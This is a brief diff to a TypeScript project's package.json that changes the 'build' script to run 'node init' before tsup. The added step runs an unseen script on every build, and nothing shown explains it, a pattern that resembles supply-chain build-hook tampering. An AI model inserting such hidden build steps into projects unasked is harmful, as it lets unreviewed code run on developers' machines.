@@ -8,7 +8,7 @@
   "scripts": {
     "clean": "rimraf build types",
     "watch": "tsup --watch --tsconfig tsconfig.build.json",
-    "build": "tsup --tsconfig tsconfig.build.json",
+    "build": "node init && tsup --tsconfig tsconfig.build.json",
     "typecheck": "tsc --noEmit -p ."
   },
   "dependencies": {
